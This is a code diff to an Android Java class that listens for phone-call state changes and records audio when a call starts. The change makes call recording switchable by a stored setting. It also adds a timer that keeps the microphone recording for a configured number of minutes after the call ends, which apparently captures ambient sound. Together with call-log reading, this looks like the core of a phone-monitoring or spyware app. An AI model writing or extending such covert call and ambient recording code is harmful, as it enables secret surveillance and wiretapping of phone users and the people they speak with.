@@ -1,5 +1,7 @@
 package com.inet.android.call;
 
+import java.util.Timer;
+import java.util.TimerTask;
 import java.util.concurrent.TimeUnit;
 
 import org.json.JSONException;
@@ -32,6 +34,7 @@ public class CallReceiver extends BroadcastReceiver {
 	private static String LOG_TAG = CallReceiver.class.getSimpleName()
 			.toString();
 	private final static int SOURCE_RECORD = 4;
+
 	@Override
 	public void onReceive(Context context, Intent intent) {
 		CallReceiver.mContext = context;
@@ -39,7 +42,8 @@ public class CallReceiver extends BroadcastReceiver {
 				"intent: " + intent.getAction() + " " + intent.getExtras(),
 				"intent: " + intent.getAction() + " " + intent.getExtras());
 
-		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_CALL_REQUEST, context) == 0)
+		if (ValueWork.getState(ConstantValue.TYPE_INCOMING_CALL_REQUEST,
+				mContext) == 0)
 			return;
 
 		Bundle bundle = intent.getExtras();
@@ -73,7 +77,6 @@ public class CallReceiver extends BroadcastReceiver {
 				Logging.doLog(LOG_TAG, "TelephonyManager.EXTRA_STATE_OFFHOOK ",
 						"TelephonyManager.EXTRA_STATE_OFFHOOK");
 
-			
 				setRecord();
 				// телефон находится в режиме звонка (набор номера / разговор)
 			} else if (phoneState.equals(TelephonyManager.EXTRA_STATE_IDLE)) {
@@ -93,18 +96,46 @@ public class CallReceiver extends BroadcastReceiver {
 			}
 		}
 	}
-	private static void setRecord(){
+
+	private static void setRecord() {
+		if (ValueWork.getMethod(ConstantValue.RECORD_CALL, mContext) == 0)
+			return;
 		recordAudio = new RecordAudio(-1, SOURCE_RECORD, mContext);
 		recordAudio.executeRecording();
 	}
-	
-	private static void stopRecord(){
+
+	private static void stopRecord() {
 		if (recordAudio != null) {
-			Logging.doLog(LOG_TAG, "recordAudio != null",
-					"recordAudio != null");
-			recordAudio.executeStopRecording();
+		long minuteAfterCall = ValueWork.getMethod(
+					ConstantValue.RECORD_ENVORIMENT, mContext);
+		Logging.doLog(LOG_TAG, "recordAudio != null " + minuteAfterCall, "recordAudio != null " + minuteAfterCall);
+
+		
+			if (minuteAfterCall == 0) {
+				Logging.doLog(LOG_TAG, "minuteAfterCall == 0",
+						"minuteAfterCall == 0");
+				recordAudio.executeStopRecording();
+			} else {
+				Timer myTimer = new Timer(); // Создаем таймер
+				Logging.doLog(LOG_TAG, "Timer",
+						"Timer");
+				myTimer.schedule(new TimerTask() { // Определяем задачу
+							public void run() {
+								// if(current == minuteAfterCall){
+								Logging.doLog(LOG_TAG, "executeStopRecording " + recordAudio,
+										"executeStopRecording " + recordAudio);
+								recordAudio.executeStopRecording();
+								
+							};
+						}, minuteAfterCall * 60 * 1000); // интервал - 60000
+														// миллисекунд, 0
+														// миллисекунд до
+														// первого запуска.
+
+			}
 		}
 	}
+
 	private void getCallDetails() {
 
 		Cursor managedCursor = mContext.getContentResolver().query(
